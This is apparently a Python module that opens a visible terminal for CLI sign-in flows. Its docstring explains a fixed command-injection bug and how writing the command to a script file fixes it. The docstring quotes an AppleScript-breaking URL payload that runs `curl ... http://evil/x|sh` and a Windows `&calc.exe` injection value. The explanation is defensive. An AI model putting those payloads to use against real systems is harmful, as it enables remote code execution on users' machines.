"""Opening a visible terminal, because some sign-ins cannot be driven from behind a UI.

Flows in this app end in a browser or in an interactive prompt: `claude` and its
`/login`, `codex login`, and approving an MCP server. They wait on something and print
something the operator needs to read, so none can be run hidden. A hidden sign-in is not
a quiet sign-in — it is a button that appears to do nothing.

## The command is written to a file, and never interpolated into a string

The first version of this module built one string per platform and handed it to the
platform's launcher — `cmd /k <argv…>` on Windows, and on macOS an AppleScript literal:

    osascript -e 'tell application "Terminal" to do script "<the command>"'

That was a remote code execution bug, and it is worth stating exactly how, because the
mistake is an easy one to make again.

`shlex.quote` protects a **POSIX shell**. It does nothing for an AppleScript string
literal: it leaves `"` untouched, and — worse — it *emits* `"` characters of its own
whenever the input contains an apostrophe. So a connector URL of

    https://a" & (do shell script "curl -s http://evil/x|sh") & "

closed the AppleScript literal and ran a shell command as the logged-in user, with no
Terminal window involved. An ordinary URL containing an apostrophe was enough to corrupt
the script by accident. On Windows the same shape failed differently: `list2cmdline`
quotes arguments containing spaces and never escapes `& | < > ^`, so
`https://a&calc.exe` — no spaces — ran `calc.exe` through `cmd`.

The fix is not better escaping. Escaping for a shell nested inside AppleScript nested
inside an argv is a thing nobody can review. **The command is written to a script file
and the terminal is pointed at the file**, so no untrusted text is ever parsed as
program text by anything. `shlex.join` writes the POSIX script; the Windows batch file
takes each argument on its own quoted line. Neither is built by concatenating a URL into
syntax.

Callers must still validate their inputs — see `connectors._SAFE_KEY` and the URL check
in `start_browser_signin`. Two independent defences, because this one is a boundary and
boundaries get moved.

## The launch is checked, not assumed

`Popen` is fire-and-forget: the old version returned "a terminal opened" whether or not
one did, so an AppleScript syntax error, a denied Automation permission, or a
`gnome-terminal` that rejects its arguments all reported success. The child is now given
a moment to fail and its exit status is read, so "it opened" is a claim with something
behind it.

`gnome-terminal` is deliberately invoked with `--` and not `-e`: `-e` takes a single
string and rejects trailing positionals, and `x-terminal-emulator` on a GNOME desktop
points at `gnome-terminal` — so the first entry in the list was the one that did not
work.
"""

from __future__ import annotations

import os
import shlex
import shutil
import stat
import subprocess
import tempfile
from pathlib import Path

# Tried in order, with the argument form each one actually accepts. `--` is the modern
# separator and is understood by all three; `-e` is not.
_LINUX_TERMINALS = (
    ("x-terminal-emulator", "--"),
    ("gnome-terminal", "--"),
    ("konsole", "-e"),
    ("xterm", "-e"),
)

# How long to wait for the launcher to fall over before believing it worked. Long enough
# for osascript to report a syntax error, short enough that a terminal which stays open —
# the success case — is not waited on.
_SETTLE_SECONDS = 1.5


def _both(argv: list[str], then: list[str] | None) -> str:
    """Both commands as a person would type them, one per line."""
    lines = [command_line(argv)]
    if then:
        lines.append(command_line(then))
    return "\n    ".join(lines)


def command_line(argv: list[str]) -> str:
    """The command as a person would type it, for a message that has to name it."""
    return shlex.join(argv)


def _script_file(argv: list[str], then: list[str] | None = None) -> Path:
    """The command — or two of them — as a file a terminal can be pointed at.

    Written rather than interpolated. See the module docstring — this function is the
    whole defence, and the reason it exists is a proved injection.

    `then` runs after `argv` **whether or not it succeeded**, which is deliberate and is
    the reason it is a second argv rather than something the caller joins itself. The
    pair this exists for is `claude mcp add` followed by `claude mcp login`: `add`
    refuses a name that is already registered, and re-signing in to a connector you
    already added is an ordinary thing to do. Chaining on success would make the second
    press of the button do nothing, which is exactly when it is pressed.
    """
    if os.name == "nt":
        # One argument per line, each quoted by `list2cmdline`, which is the encoding
        # `cmd` itself uses for an argv. No metacharacter reaches the parser unquoted
        # because nothing is concatenated into a command line here.
        lines = ["@echo off", subprocess.list2cmdline(argv)]
        if then:
            lines.append(subprocess.list2cmdline(then))
        body = "\r\n".join(lines) + "\r\n"
        suffix = ".cmd"
    else:
        lines = ["#!/bin/sh", shlex.join(argv)]
        if then:
            lines.append(shlex.join(then))
        body = "\n".join(lines) + "\n"
        suffix = ".sh"

    # `delete=False` because the terminal reads this file after we return; the OS
    # temp directory is what cleans it up. Written 0600 by NamedTemporaryFile, which
    # matters — it briefly holds a command line naming an endpoint.
    with tempfile.NamedTemporaryFile(
            "w", suffix=suffix, prefix="forgecast-signin-", delete=False,
            encoding="utf-8", newline="") as handle:
        handle.write(body)
        name = handle.name
    path = Path(name)
    if os.name != "nt":
        path.chmod(path.stat().st_mode | stat.S_IXUSR)
    return path


def _launched(process: subprocess.Popen) -> tuple[bool, str]:
    """Did the launcher survive long enough to have worked.

    A terminal that opened stays running, so a process still alive after the settle
    window is the success case. One that has already exited non-zero is the failure the
    old code reported as success.
    """
    try:
        code = process.wait(timeout=_SETTLE_SECONDS)
    except subprocess.TimeoutExpired:
        return True, ""
    if code == 0:
        # Exited cleanly and immediately. Normal for `open`, which hands off to an
        # already-running Terminal and returns.
        return True, ""
    return False, f"the terminal launcher exited with code {code}"


def open_terminal(argv: list[str], *, done: str, manual: str,
                  then: list[str] | None = None) -> tuple[bool, str]:
    """Run `argv` — and then `then` — in a console the operator can see.

    `done` is what to say when a window opened; `manual` is the instruction to put above
    the command when no terminal could be opened. Both are passed in because the sentence
    differs per flow, and a generic message is how a button ends up telling you to do
    something that flow does not ask for.
    """
    if not argv:                                                      # pragma: no cover
        return False, "Nothing to run."

    script = _script_file(argv, then)
    try:
        if os.name == "nt":
            process = subprocess.Popen(
                ["cmd", "/k", str(script)],
                creationflags=getattr(subprocess, "CREATE_NEW_CONSOLE", 0))
        elif shutil.which("open"):                                            # macOS
            # `open -a Terminal <file>` runs the file. This is the form that takes a
            # path rather than a command, which is why the command is a path now.
            process = subprocess.Popen(["open", "-a", "Terminal", str(script)])
        else:
            chosen = next(((name, flag) for name, flag in _LINUX_TERMINALS
                           if shutil.which(name)), None)
            if chosen is None:
                return False, f"{manual}\n\n    {_both(argv, then)}"
            name, flag = chosen
            process = subprocess.Popen([name, flag, "/bin/sh", str(script)])
    except OSError as exc:
        return False, f"Could not open a terminal: {type(exc).__name__}: {exc}"

    ok, why = _launched(process)
    if not ok:
        return False, (f"A terminal could not be opened ({why}). Run this yourself:"
                       f"\n\n    {_both(argv, then)}")
    return True, done
